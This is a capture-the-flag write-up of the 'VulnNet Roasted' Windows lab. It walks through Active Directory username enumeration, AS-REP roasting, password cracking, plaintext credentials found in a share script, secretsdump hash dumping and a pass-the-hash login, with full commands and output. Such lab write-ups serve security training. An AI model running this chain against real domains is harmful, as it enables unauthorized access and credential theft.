# THM: VulnNet Roasted

## Reconnaissance

An nmap nse ldap script found the domain name of the system. 

```
PORT    STATE SERVICE REASON          VERSION
389/tcp open  ldap    syn-ack ttl 125 Microsoft Windows Active Directory LDAP 
(Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=vulnnet-rst,DC=local
|       ldapServiceName: vulnnet-rst.local:win-2bo8m1oe1m1$@VULNNET-RST.LOCAL

```
Two intersting SMB shares were able to read read anonymously. 

```
VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business
Sharing
	.\VulnNet-Business-Anonymous\*
	dr--r--r--                0 Fri Mar 12 22:21:04 2021	.
	dr--r--r--                0 Fri Mar 12 22:21:04 2021	..
	fr--r--r--              758 Fri Mar 12 22:21:04 2021	Business-Manager.txt
	fr--r--r--              654 Fri Mar 12 22:21:04 2021	Business-Sections.txt
	fr--r--r--              471 Fri Mar 12 22:21:04 2021	Business-Tracking.txt
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
	.\VulnNet-Enterprise-Anonymous\*
	dr--r--r--                0 Fri Mar 12 22:19:59 2021	.
	dr--r--r--                0 Fri Mar 12 22:19:59 2021	..
	fr--r--r--              467 Fri Mar 12 22:19:59 2021	Enterprise-Operations.txt
	fr--r--r--              503 Fri Mar 12 22:19:59 2021	Enterprise-Safety.txt
	fr--r--r--              496 Fri Mar 12 22:19:59 2021	Enterprise-Sync.txt
```

From these files found multiple mentions of full names which I added to a file 
called `names.txt`. I then used a simple python script I wrote to generate
possible usernames based on common conventions saving the output as
`usernames.txt`.
[Link to repo.](https://github.com/Ru57y5hck3lfrd/username-generator)

```
[kali@kali ~/thm/vulnet-roasted/exploit] python username-gen.py names.txt 
usernames.txt
```

Using kerbrute's userenum module in conjunction the usernames list I found 4
valid usernames. 
 
```
[kali@kali ~/thm/vulnet-roasted/exploit] /opt/kerbrute/kerbrute_linux_386 
userenum -d vulnnet-rst.local --dc 10.10.174.217  usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/22/22 - Ronnie Flathers @ropnop

2022/11/22 15:51:06 >  Using KDC(s):
2022/11/22 15:51:06 >  	10.10.174.217:88

2022/11/22 15:51:06 >  [+] VALID USERNAME:	 a-whitehat@vulnnet-rst.local
2022/11/22 15:51:07 >  [+] VALID USERNAME:	 j-goldenhand@vulnnet-rst.local
2022/11/22 15:51:07 >  [+] VALID USERNAME:	 t-skid@vulnnet-rst.local
2022/11/22 15:51:07 >  [+] VALID USERNAME:	 j-leet@vulnnet-rst.local
2022/11/22 15:51:08 >  Done! Tested 96 usernames (4 valid) in 2.115 seconds
```

I added these known valid usernames to a file called `valid-usernames.txt`
adding Administrator, Guest, and krbtgt to the list as well.

I checked for ASREP-roastable users with Impacket's GetNPUsers, this got the
hash for the user t-skid.

```
[kali@kali ~/thm/vulnet-roasted/exploit] impacket-GetNPUsers -dc-ip 10.10.174.217 -usersfile valid-users.txt vulnnet-rst.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8bd68bdbd1c4ceca5c9470bcad44201a$42c1755232514a74d9e026c2c08b40209dbdcbd4b389cd19e50064b67e55fb081bcd188833f644956ef75a5594a18407c4577480456f444ebab162eaa0a7b3e083a6db1c65aaec10547cded0c0f378b5f0bd6b83fbcec8878d7defcd415971c2e49fb4dbc9128147053d131bd095971c88a8ba4464a865fcf8721675869e6fb76fc13ccca55bf6eb069262a959f104d264e8ad8a1a93c46750ce978958d62f801dacafa613b7e2847f8444dccff63e5430fddfb846c66a3409aa3e1e2dad2686d8b333e9514468bd67a8beac4b6d0b5fc48e4810c2c0b7e7e34550a04f5de05e8ceef41248dcd28909dac858c1f578d43834570ffee2
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

## Initial Access

I used john to crack the t-skids password with the `rockyou.txt` wordlist. 

```
[kali@kali ~/thm/vulnet-roasted/loot] john --wordlist=/usr/share/wordlists/rockyou.txt 
--format=krb5asrep asrep.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:01 DONE (2022-11-22 15:59) 0.5464g/s 1736Kp/s 1736Kc/s 1736KC/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I attempted to log on with these credentials via the usual methods without
success. However, 
Using crackmapexec's smb spider module with these credentials we now have access 
to a vbs script called ResetPassword located in NETLOGON. This file contained
plain-text credentials for the user a-whitehat.

```
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

```  

Using crackmapexec I confirmed that these credentials were valid. 

```
[kali@kali ~/thm/vulnet-roasted/loot] crackmapexec smb -u 'a-whitehat'
-p 'bNdKVkjv3RR9ht' -d vulnnet-rst.local 10.10.174.217         
SMB         10.10.174.217   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.174.217   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

Attempts to log in with psexec failed even though this user could write to the
shares, but I was able to log on using wmiexec. 

```
[kali@kali ~/thm/vulnet-roasted/loot] impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.174.217
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vulnnet-rst\a-whitehat

C:\>
```

This user is in the Domain Admin's group, but can't read the system.txt file.

## Privilege Escalation

I used Impacket's secretsdump to dump the hashes of all domain users.

```
[kali@kali ~/thm/vulnet-roasted/loot] impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.174.217                             
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...snip...
```

I used a Pass-The-Hash attack to log in as adminitstator via `evil-winrm`.

```
[kali@kali ~/thm/vulnet-roasted/loot] evil-winrm -u administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.174.217                                     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
```
